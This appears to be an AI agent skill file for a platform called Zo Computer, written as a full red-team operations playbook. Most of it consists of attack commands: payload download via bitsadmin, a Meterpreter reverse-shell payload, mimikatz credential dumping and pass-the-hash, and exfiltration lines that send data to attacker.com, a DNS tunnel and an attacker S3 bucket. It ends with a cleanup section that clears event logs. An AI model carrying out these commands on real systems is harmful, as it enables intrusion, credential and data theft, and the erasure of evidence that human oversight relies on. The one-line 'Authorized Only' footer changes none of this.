---
name: red-team
description: Full-spectrum red team operations — network infiltration, AD attacks, lateral movement, persistence, and exfiltration. Use for comprehensive security assessments or simulated APT campaigns.
compatibility: Created for Zo Computer
metadata:
  author: morningstar.zo.computer
---

# RED TEAM SKILL

Full-spectrum offensive operations framework.

## Attack Lifecycle

```
RECON → INITIAL ACCESS → EXECUTION → PERSISTENCE → PRIVESC → LATERAL → EXFIL → CLEANUP
```

---

## RECON

### External Recon
```bash
# Subdomain enumeration
amass enum -passive -d target.com -o subdomains.txt
amass enum -active -d target.com -o subdomains_active.txt

# Port scanning
masscan -p1-65535 10.10.10.0/24 --rate=10000 -oJ masscan.json
nmap -sV -sC -p- target.com -oA nmap_full

# Technology fingerprint
whatweb target.com
wappalyzer target.com
builtwith target.com

# GitHub recon
gitrob target.com
ggshield scan commit-range HEAD~20
```

### Internal Recon
```bash
# AD enumeration
BloodHound.py -d domain.com -u user -p pass --dc 10.10.10.1 -c all
enum4linux -a target.com
rpcclient target.com -U ""

# SMB enumeration
smbclient -L //target.com -N
smbmap -H target.com
enum4linux -a target.com

# LDAP enumeration
ldapsearch -x -h target.com -b "dc=domain,dc=com"
```

---

## INITIAL ACCESS VECTORS

### Phishing
- Spear phishing with custom lure
- Watering hole attacks
- OAuth consent phishing
- spear phishing (link/bait/credential harvest)

### Exposed Services
- VPN exploitation (OpenVPN, Pulse, Fortinet)
- RDP brute force
- SSH brute force
- Web application exploits
- Database exposure
- Jenkins/RabbitMQ/Grafana exploitation

### Supply Chain
- Dependencies hijacking
- Build process injection
- CI/CD compromise

---

## EXECUTION

### Living off the Land
```bash
# LOLBAS (Living Off the Land Binaries)
certutil.exe -decode encoded.txt payload.exe
bitsadmin /transfer job http://attacker.com/payload.exe C:\temp\payload.exe

# WMIExec
impacket-wmiexec domain/user:pass@target.com

# PsExec
psexec.py domain/user:pass@target.com cmd.exe
```

### Custom Payloads
```bash
# Metasploit
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f exe -o payload.exe

# Covenant C2
dotnet new -i covenant
```

---

## PERSISTENCE

### Windows
```
- Scheduled tasks (schtasks /create)
- Registry run keys (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
- Startup folder shortcuts
- WMI event subscriptions
- DLL hijacking
- COM hijacking
- Service creation
- ASPX web shell
```

### Linux
```
- Cron jobs (crontab -e)
- SSH keys (authorized_keys)
- init.d scripts
- systemd services
- LD_PRELOAD injection
- PAM backdoor
- Web shell (PHP/Python/Node)
```

### AD Persistence
```
- Golden Ticket (Kerberos ticket forgery)
- Silver Ticket (service ticket forgery)
- DCShadow (domain replication backdoor)
- SID History abuse
- ACL manipulation
- Trusted Forest relationships
```

---

## PRIVILEGE ESCALATION

### Windows
```bash
# Automated
winPEAS.exe
PowerUp.ps1
SharpUp.exe

# Kernel exploits
CVE-2022-0847 (Dirty Pipe)
CVE-2023-32233 (NFTables)
CVE-2021-4034 (Polkit)

# Service exploits
powershell -exec Bypass -Command "Get-ServiceUnquoted"
powershell -exec Bypass -Command "Get-ModifiableServiceFile"
```

### Linux
```bash
# Automated
linPEAS.sh
linPEAS.sh -a
unix-privesc-check

# Sudo exploits
sudo -l
GTFOBins

# Kernel exploits
CVE-2021-4034 (pwnkit)
CVE-2022-0847 (dirty pipe)
CVE-2023-32629 (ovl_redirect)
```

### AD Privesc
```
- Kerberoasting
- AS-REP Roasting
- Password Spraying
- Unconstrained Delegation
- Constrained Delegation + Resource-based Constrained Delegation
- ACL abuse (WriteDACL, WriteProperty)
- DNSAdmins abuse
```

---

## LATERAL MOVEMENT

```bash
# Pass the Hash
impacket-psexec -hashes :NTLMhash user@target.com

# Pass the Ticket
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ppt ticket.kirbi

# Overpass the Hash
mimikatz # sekurlsa::pth /user:user /ntlm:NTLMhash /ticket:ticket.kirbi

# Remote execution
crackmapexec smb target.com -u user -p pass -X "whoami"
wmiexec.py domain/user:pass@target.com "cmd.exe"
```

---

## DATA EXFILTRATION

```
# DNS tunneling
dnscat2-client --domain tunnel.attacker.com

# ICMP tunneling
ping -l 65500 -n 1 attacker.com

# Cloud exfil
aws s3 cp data.tar.gz s3://attacker-bucket/

# Encrypted exfil
gpg -e -r attacker@email.com data.tar.gz
curl -X POST -F "file=@data.tar.gz.gpg" http://attacker.com/upload
```

---

## CLEANUP

```
- Clear event logs (wevtutil cl System)
- Remove scheduled tasks
- Delete temporary payloads
- Clear command history
- Remove persistence artifacts
- Kill sessions
- Clear network connections
```

---

## MITRE ATT&CK Mapping

Every technique maps to MITRE ATT&CK:
- T1190 — Exploit Public-Facing Application
- T1133 — External Remote Services
- T1078 — Valid Accounts
- T1059 — Command and Scripting Interpreter
- T1548 — Abuse Elevation Control Mechanism
- T1021 — Remote Services
- T1047 — Windows Management Instrumentation
- T1053 — Scheduled Task/Job
- T1484 — Domain Trust Modification
- T1550 — Use Alternate Authentication Material

---

*Red Team Operations — Authorized Only*